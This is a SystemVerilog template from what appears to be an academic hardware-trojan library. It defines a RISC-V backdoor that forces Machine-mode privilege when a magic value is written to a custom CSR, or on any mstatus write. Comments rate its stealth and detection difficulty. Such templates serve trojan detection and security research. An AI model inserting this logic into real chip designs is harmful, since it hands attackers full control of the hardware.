/**
 * Hardware Trojan Template: Privilege Escalation
 * 
 * Category: Combinational Logic
 * Pattern Type: Privilege Escalation (Simplified)
 * 
 * Source: Bailey (2017) - Adapted for combinational logic
 * Reference: D. A. Bailey, "The RISC-V Files," 2017
 * 
 * Description:
 *   Simplified privilege escalation for combinational logic paths.
 *   Forces Machine mode based on immediate trigger condition.
 *   
 * LIMITATION:
 *   Real privilege escalation attacks typically require sequential logic
 *   to maintain escalated state. This combinational version is simplified
 *   and primarily useful for demonstrating the concept or for specific
 *   combinational privilege paths.
 *
 * RISC-V Adaptation:
 *   Intercepts privilege level signals in combinational paths
 *
 * Author: Sharjeel Imtiaz (Tallinn University of Technology)
 * Date: January 2026
 */

module needs_trojan (
    // CSR access signals
    input  logic        vaddr,         // csr_we or csr_access
    input  logic [11:0] {{CSR_ADDR}},              // csr address
    input  logic [31:0] {{CSR_WDATA}},             // csr write data
    
    // Privilege level (combinational path)
    input  logic [1:0]  {{PRIV_LEVEL_NORMAL}},     // Normal privilege level
    output logic [1:0]  {{PRIV_LEVEL}}             // Trojaned privilege level
);

    // ============================================================
    // RISC-V Privilege Levels
    // ============================================================
    
    localparam logic [1:0] PRIV_LVL_M = 2'b11;  // Machine mode
    localparam logic [1:0] PRIV_LVL_S = 2'b01;  // Supervisor mode
    localparam logic [1:0] PRIV_LVL_U = 2'b00;  // User mode
    
    // Magic trigger values
    localparam logic [11:0] TRIGGER_CSR  = 12'h7C0;      // Custom CSR
    localparam logic [31:0] MAGIC_VALUE  = 32'hDEADBEEF; // Magic pattern
    
    // ============================================================
    // TROJAN TRIGGER LOGIC (Combinational)
    // ============================================================
    
    wire trojan_escalate;
    
    // Trigger: Magic CSR write pattern
    assign trojan_escalate = vaddr && 
                            ({{CSR_ADDR}} == TRIGGER_CSR) && 
                            ({{CSR_WDATA}} == MAGIC_VALUE);
    
    // Alternative trigger: Any write to mstatus (0x300)
    wire trigger_mstatus_access;
    assign trigger_mstatus_access = vaddr && 
                                   ({{CSR_ADDR}} == 12'h300);
    
    // ============================================================
    // TROJAN PAYLOAD LOGIC (Combinational)
    // ============================================================
    
    // Force Machine mode when triggered
    assign {{PRIV_LEVEL}} = (trojan_escalate || trigger_mstatus_access) ? 
                            PRIV_LVL_M : 
                            {{PRIV_LEVEL_NORMAL}};

endmodule

/**
 * Usage Example: Combinational privilege path
 * 
 * module priv_check_trojan (
 *     input  logic        csr_we_int,
 *     input  logic [11:0] csr_addr,
 *     input  logic [31:0] csr_wdata_int,
 *     input  logic [1:0]  priv_lvl_normal,
 *     output logic [1:0]  priv_lvl_checked
 * );
 *     // Escalates to M-mode on specific CSR access
 * endmodule
 *
 * IMPORTANT LIMITATIONS:
 *   - No state retention (escalation only lasts one cycle)
 *   - Less stealthy than sequential version
 *   - Limited practical use in real attacks
 *   - Included primarily for template library completeness
 *
 * Detection Difficulty: Medium
 *   - Combinational escalation is easier to detect
 *   - Formal verification can catch unauthorized privilege changes
 *   - Less effective than sequential version
 *
 * RECOMMENDATION:
 *   For realistic privilege escalation attacks, use the sequential
 *   template (privilege_template.sv) which maintains escalated state.
 *   This combinational version is primarily for educational purposes.
 */